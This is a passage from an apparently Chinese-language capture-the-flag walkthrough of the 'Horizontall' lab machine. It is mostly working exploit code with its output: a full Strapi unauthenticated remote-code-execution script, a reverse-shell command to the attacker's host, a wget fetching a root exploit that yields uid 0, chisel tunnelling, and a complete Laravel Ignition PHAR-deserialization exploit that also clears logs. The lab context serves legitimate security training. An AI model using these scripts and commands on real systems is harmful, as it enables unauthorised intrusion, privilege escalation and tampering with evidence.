class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)</span><br><span class="hljs-comment"># Date: 2021-08-30</span><br><span class="hljs-comment"># Exploit Author: Musyoka Ian</span><br><span class="hljs-comment"># Vendor Homepage: https://strapi.io/</span><br><span class="hljs-comment"># Software Link: https://strapi.io/</span><br><span class="hljs-comment"># Version: Strapi CMS version 3.0.0-beta.17.4 or lower</span><br><span class="hljs-comment"># Tested on: Ubuntu 20.04</span><br><span class="hljs-comment"># CVE : CVE-2019-18818, CVE-2019-19609</span><br><br><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> cmd <span class="hljs-keyword">import</span> Cmd<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Wrong number of arguments provided&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Usage: python3 exploit.py &lt;URL&gt;\n&quot;</span>)<br>    sys.exit()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Terminal</span>(<span class="hljs-title class_ inherited__">Cmd</span>):<br>    prompt = <span class="hljs-string">&quot;$&gt; &quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">default</span>(<span class="hljs-params">self, args</span>):<br>        code_exec(args)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_version</span>():<br>    <span class="hljs-keyword">global</span> url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Checking Strapi CMS Version running&quot;</span>)<br>    version = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/init&quot;</span>).text<br>    version = json.loads(version)<br>    version = version[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;strapiVersion&quot;</span>]<br>    <span class="hljs-keyword">if</span> version == <span class="hljs-string">&quot;3.0.0-beta.17.4&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Version mismatch trying the exploit anyway&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">password_reset</span>():<br>    <span class="hljs-keyword">global</span> url, jwt<br>    session = requests.session()<br>    params = &#123;<span class="hljs-string">&quot;code&quot;</span> : &#123;<span class="hljs-string">&quot;$gt&quot;</span>:<span class="hljs-number">0</span>&#125;,<br>            <span class="hljs-string">&quot;password&quot;</span> : <span class="hljs-string">&quot;SuperStrongPassword1&quot;</span>,<br>            <span class="hljs-string">&quot;passwordConfirmation&quot;</span> : <span class="hljs-string">&quot;SuperStrongPassword1&quot;</span><br>            &#125;<br>    output = session.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/auth/reset-password&quot;</span>, json = params).text<br>    response = json.loads(output)<br>    jwt = response[<span class="hljs-string">&quot;jwt&quot;</span>]<br>    username = response[<span class="hljs-string">&quot;user&quot;</span>][<span class="hljs-string">&quot;username&quot;</span>]<br>    email = response[<span class="hljs-string">&quot;user&quot;</span>][<span class="hljs-string">&quot;email&quot;</span>]<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;jwt&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Password reset unsuccessfull\n[-] Exiting now\n\n&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Password reset was successfully\n[+] Your email is: <span class="hljs-subst">&#123;email&#125;</span>\n[+] Your new credentials are: <span class="hljs-subst">&#123;username&#125;</span>:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: <span class="hljs-subst">&#123;jwt&#125;</span>\n\n&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">code_exec</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-keyword">global</span> jwt, url<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don&#x27;t expect to see output&quot;</span>)<br>    headers = &#123;<span class="hljs-string">&quot;Authorization&quot;</span> : <span class="hljs-string">f&quot;Bearer <span class="hljs-subst">&#123;jwt&#125;</span>&quot;</span>&#125;<br>    data = &#123;<span class="hljs-string">&quot;plugin&quot;</span> : <span class="hljs-string">f&quot;documentation &amp;&amp; $(<span class="hljs-subst">&#123;cmd&#125;</span>)&quot;</span>,<br>            <span class="hljs-string">&quot;port&quot;</span> : <span class="hljs-string">&quot;1337&quot;</span>&#125;<br>    out = requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;url&#125;</span>/admin/plugins/install&quot;</span>, json = data, headers = headers)<br>    <span class="hljs-built_in">print</span>(out.text)<br><br><span class="hljs-keyword">if</span> __name__ == (<span class="hljs-string">&quot;__main__&quot;</span>):<br>    url = sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> url.endswith(<span class="hljs-string">&quot;/&quot;</span>):<br>        url = url[:-<span class="hljs-number">1</span>]<br>    check_version()<br>    password_reset()<br>    terminal = Terminal()<br>    terminal.cmdloop()<br></code></pre></td></tr></table></figure><p>这是一个组合漏洞，首先会重置用户的密码，虽然我不知道是哪个，看目录像是admin，重置成功后便会生成返回一个JWT Token，然后带着令牌去请求&#x2F;admin&#x2F;plugins&#x2F;install执行cmd，Rember this is a blind RCE don’t expect to see output。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; python3 50239.py http://api-prod.horizontall.htb<br>[+] Checking Strapi CMS Version running<br>[+] Seems like the exploit will work!!!<br>[+] Executing exploit<br><br><br>[+] Password reset was successfully<br>[+] Your email is: admin@horizontall.htb<br>[+] Your new credentials are: admin:SuperStrongPassword1<br>[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjUyNzYzMDk0LCJleHAiOjE2NTUzNTUwOTR9.0WODcG0DqsHwETYjBNYwk9eVrLdIcY1xRV-rbkyDpFQ<br><br><br>$&gt; <span class="hljs-built_in">id</span><br>[+] Triggering Remote code executin<br>[*] Rember this is a blind RCE don<span class="hljs-string">&#x27;t expect to see output</span><br><span class="hljs-string">&#123;&quot;statusCode&quot;:400,&quot;error&quot;:&quot;Bad Request&quot;,&quot;message&quot;:[&#123;&quot;messages&quot;:[&#123;&quot;id&quot;:&quot;An error occurred&quot;&#125;]&#125;]&#125;</span><br><span class="hljs-string">$&gt; bash -c &#x27;</span>bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1<span class="hljs-string">&#x27;</span><br><span class="hljs-string">[+] Triggering Remote code executin</span><br><span class="hljs-string">[*] Rember this is a blind RCE don&#x27;</span>t expect to see output<br><br></code></pre></td></tr></table></figure><h4 id="Reverse-shell："><a href="#Reverse-shell：" class="headerlink" title="Reverse shell："></a>Reverse shell：</h4><p>有对user目录的读取权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; nc -lvnp 9001<br>listening on [any] 9001 ...<br>connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 36446<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1787): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>strapi@horizontall:~/myapi$ <br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span><br>api    config      favicon.ico   package.json       public<br>build  extensions  node_modules  package-lock.json  README.md<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">ls</span> /home/<br>developer<br>strapi@horizontall:~/myapi$ <span class="hljs-built_in">cat</span> /home/developer/user.txt <br>e1...................................<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:/$ find /  -perm /6000 2&gt;/dev/null                 <br>/sbin/pam_extrausers_chkpwd<br>/sbin/unix_chkpwd<br>/usr/bin/mlocate<br>/usr/bin/sudo<br>/usr/bin/newgidmap<br>/usr/bin/bsd-write<br>/usr/bin/traceroute6.iputils<br>/usr/bin/newuidmap<br>/usr/bin/gpasswd<br>/usr/bin/chage<br>/usr/bin/at<br>/usr/bin/chfn<br>/usr/bin/passwd<br>/usr/bin/wall<br>/usr/bin/crontab<br>/usr/bin/ssh-agent<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/expiry<br>/usr/bin/chsh<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/usr/lib/x86_64-linux-gnu/utempter/utempter<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/snapd/snap-confine<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/local/share/fonts<br>/usr/local/lib/python3.6<br>/usr/local/lib/python3.6/dist-packages<br>/usr/local/lib/python2.7<br>/usr/local/lib/python2.7/dist-packages<br>/usr/local/lib/python2.7/site-packages<br>/var/mail<br>/var/log/journal<br>/var/log/journal/3cc9504f7ded4867a4c8ca16476b1378<br>/var/local<br>/bin/fusermount<br>/bin/ping<br>/bin/su<br>/bin/umount<br>/bin/mount<br>strapi@horizontall:/$ <br></code></pre></td></tr></table></figure><h4 id="CVE-2021-2043："><a href="#CVE-2021-2043：" class="headerlink" title="CVE-2021-2043："></a>CVE-2021-2043：</h4><p>这个漏洞是新漏洞，不能作数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ wget http://10.10.16.7/CVE-2021-2043.py<br>--2022-05-17 05:06:37--  http://10.10.16.7/CVE-2021-2043.py<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3448 (3.4K) [text/x-python]<br>Saving to: ‘CVE-2021-2043.py’<br><br>CVE-2021-2043.py    100%[===================&gt;]   3.37K  --.-KB/s    <span class="hljs-keyword">in</span> 0.1s    <br><br>2022-05-17 05:06:38 (24.6 KB/s) - ‘CVE-2021-2043.py’ saved [3448/3448]<br><br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span><br>CVE-2021-2043.py  myapi<br>strapi@horizontall:~$ python3 CVE-2021-2043.py <br><span class="hljs-comment"># ID</span><br>sh: 1: ID: not found<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root),1001(strapi)<br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h4 id="CVE-2021-3129："><a href="#CVE-2021-3129：" class="headerlink" title="CVE-2021-3129："></a>CVE-2021-3129：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ netstat -ano<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      off (0.00/0/0)<br>tcp        0    144 10.10.11.105:36446      10.10.16.7:9001         ESTABLISHED on (0.34/0/0)<br>tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)<br>tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)<br>udp        0      0 10.10.11.105:50522      1.1.1.1:53              ESTABLISHED off (0.00/0/0)<br></code></pre></td></tr></table></figure><p>3306应该是个数据库，1337是欢迎页面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ curl 127.0.0.1:1337<br>&lt;!doctype html&gt;<br><br>&lt;html&gt;<br>  &lt;<span class="hljs-built_in">head</span>&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span> /&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;IE=edge,chrome=1&quot;</span> /&gt;<br>    &lt;title&gt;Welcome to your API&lt;/title&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1&quot;</span> /&gt;<br>    &lt;style&gt;<br>    &lt;/style&gt;<br>  &lt;/head&gt;<br>  &lt;body lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>    &lt;section&gt;<br>      &lt;div class=<span class="hljs-string">&quot;wrapper&quot;</span>&gt;<br>        &lt;h1&gt;Welcome.&lt;/h1&gt;<br>      &lt;/div&gt;<br>    &lt;/section&gt;<br>  &lt;/body&gt;<br>&lt;/html&gt;<br>strapi@horizontall:~$ <br></code></pre></td></tr></table></figure><p>8000端口会返回很多HTML代码，应该是个HTTP服务，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; ./chisel server -p 9000 --reverse<br>2022/05/17 13:15:32 server: Reverse tunnelling enabled<br>2022/05/17 13:15:32 server: Fingerprint QxD29/LAFhRG/uyK4saRO5hEnE3XGwEaGM7N5M5sAf0=<br>2022/05/17 13:15:32 server: Listening on http://0.0.0.0:9000<br>2022/05/17 13:20:00 server: session<span class="hljs-comment">#1: tun: proxy#R:9002=&gt;localhost:8000: Listening</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">strapi@horizontall:~$ wget http://10.10.16.7/chisel<br>--2022-05-17 05:15:11--  http://10.10.16.7/chisel<br>Connecting to 10.10.16.7:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 8077312 (7.7M) [application/octet-stream]<br>Saving to: ‘chisel’<br><br>chisel              100%[===================&gt;]   7.70M  2.15MB/s    <span class="hljs-keyword">in</span> 4.4s    <br><br>2022-05-17 05:15:16 (1.75 MB/s) - ‘chisel’ saved [8077312/8077312]<br><br>strapi@horizontall:~$ ./chisel client 10.10.16.6:9000 R:9002:localhost:8000<br>bash: ./chisel: Permission denied<br>strapi@horizontall:~$ <span class="hljs-built_in">ls</span><br>chisel  CVE-2021-2043.py  myapi<br>strapi@horizontall:~$ <span class="hljs-built_in">chmod</span> +x ./chisel <br>strapi@horizontall:~$ ./chisel client 10.10.16.7:9000 R:9002:localhost:8000<br>2022/05/17 05:19:57 client: Connecting to ws://10.10.16.7:9000<br>2022/05/17 05:19:59 client: Connected (Latency 144.170165ms)<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220517132208419.png" alt="image-20220517132208419"  /><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;&gt; searchsploit Laravel    <br>--------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                             |  Path<br>--------------------------------------------------------------------------- ---------------------------------<br>Aimeos Laravel ecommerce platform 2021.10 LTS - <span class="hljs-string">&#x27;sort&#x27;</span> SQL injection       | php/webapps/50538.txt<br>Laravel - <span class="hljs-string">&#x27;Hash::make()&#x27;</span> Password Truncation Security                      | multiple/remote/39318.txt<br>Laravel 8.4.2 debug mode - Remote code execution                           | php/webapps/49424.py<br>Laravel Administrator 4 - Unrestricted File Upload (Authenticated)         | php/webapps/49112.py<br>Laravel Log Viewer &lt; 0.13.0 - Local File Download                          | php/webapps/44343.py<br>Laravel Nova 3.7.0 - <span class="hljs-string">&#x27;range&#x27;</span> DoS                                           | php/webapps/49198.txt<br>Laravel Valet 2.0.3 - Local Privilege Escalation (macOS)                   | macos/local/50591.py<br>PHP Laravel 8.70.1 - Cross Site Scripting (XSS) to Cross Site Request Forg | php/webapps/50525.txt<br>PHP Laravel Framework 5.5.40 / 5.6.x &lt; 5.6.30 - token Unserialize Remote C | linux/remote/47129.rb<br>UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                  | php/webapps/48166.txt<br>UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload         | php/webapps/46389.py<br>--------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>searchsploit脚本不是很好用，目标并没有与之相符的日志路径，不过我又找到了以下脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><br><span class="hljs-comment"># Send a post request with a specific viewFile value, returning HTTP response</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">url=<span class="hljs-string">&#x27;&#x27;</span>, viewfile=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>    &#125;<br>    data = &#123;<br>        <span class="hljs-string">&quot;solution&quot;</span>: <span class="hljs-string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,<br>        <span class="hljs-string">&quot;parameters&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;variableName&quot;</span>: <span class="hljs-string">&quot;whateverYouWant&quot;</span>,<br>            <span class="hljs-string">&quot;viewFile&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>    &#125;<br>    data[<span class="hljs-string">&#x27;parameters&#x27;</span>][<span class="hljs-string">&#x27;viewFile&#x27;</span>] = viewfile<br>    resp = requests.post(url, json=data, headers=headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">return</span> resp<br><br><br><span class="hljs-comment"># Generate payload and return it as text</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate</span>(<span class="hljs-params">chain=<span class="hljs-string">&#x27;&#x27;</span>, command=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    <span class="hljs-comment"># Ensure that we have PHPGGC in current directory, if not we&#x27;ll clone it</span><br>    <span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&quot;phpggc&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] PHPGGC found. Generating payload and deploy it to the target&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] PHPGGC not found. Cloning it&quot;</span>)<br>        os.system(<span class="hljs-string">&quot;git clone https://github.com/ambionics/phpggc.git&quot;</span>)<br>    payload = subprocess.getoutput(<br>        <span class="hljs-string">r&quot;php -d&#x27;phar.readonly=0&#x27; ./phpggc/phpggc &#x27;%s&#x27; system &#x27;%s&#x27; --phar phar -o php://output | base64 -w0 | &quot;</span><br>        <span class="hljs-string">r&quot;sed -E &#x27;s/./\0=00/g; s/==/=3D=/g; s/$/=00/g&#x27;&quot;</span> % (chain, command))<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-comment"># Clear logs,</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clear</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] Trying to clear logs&quot;</span>)<br>    <span class="hljs-keyword">while</span> (send(url,<br>                <span class="hljs-string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf&quot;</span><br>                <span class="hljs-string">&quot;-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code != <span class="hljs-number">200</span>):<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Logs cleared&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">4</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage:   %s &lt;URL&gt; &lt;CHAIN&gt; &lt;CMD&gt;&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Example: %s http(s)://localhost:8000 Monolog/RCE1 whoami&quot;</span> % sys.argv[<span class="hljs-number">0</span>])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I recommend to use Monolog/RCE1 or Monolog/RCE2 as CHAIN&quot;</span>)<br>        exit(<span class="hljs-number">1</span>)<br>    url = sys.argv[<span class="hljs-number">1</span>] + <span class="hljs-string">&quot;/_ignition/execute-solution&quot;</span><br>    chain = sys.argv[<span class="hljs-number">2</span>]<br>    command = sys.argv[<span class="hljs-number">3</span>]<br><br>    <span class="hljs-comment"># Step 1. Clear logs, write the first log entry</span><br>    clear(url)<br>    send(url, <span class="hljs-string">&quot;AA&quot;</span>)<br><br>    <span class="hljs-comment"># Step 3. Write the second log entry with encoded PHAR payload</span><br>    send(url, generate(chain, command))<br><br>    <span class="hljs-comment"># Step 4. Convert log file to a valid PHAR</span><br>    <span class="hljs-keyword">if</span> (send(url,<br>             <span class="hljs-string">&quot;php://filter/read=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64&quot;</span><br>             <span class="hljs-string">&quot;-decode/resource=../storage/logs/laravel.log&quot;</span>).status_code == <span class="hljs-number">200</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Successfully converted logs to PHAR&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Fail to convert logs to PHAR&quot;</span>)<br><br>    <span class="hljs-comment"># Step 5. Trigger PHAR deserialization, extract the output</span><br>    response = send(url, <span class="hljs-string">&quot;phar://../storage/logs/laravel.log&quot;</span>)<br>    result = re.sub(<span class="hljs-string">&quot;&#123;[\s\S]*&#125;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, response.text)<br>    <span class="hljs-keyword">if</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] PHAR deserialized. Exploited\n&quot;</span>)<br>        <span class="hljs-built_in">print</span>(result)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[i] There is no output&quot;</span>)<br><br>    <span class="hljs-comment"># Clear logs</span><br>    clear(url)<br></code></pre></td></tr></table></figure><p>利用phpggc生成对应的phar文件→清空laravel.log → 将编码后的字符写入到log中→清除干扰字符→执行phar反序列化.phar反序列化就是可以在<strong>不使用php函数unserialize 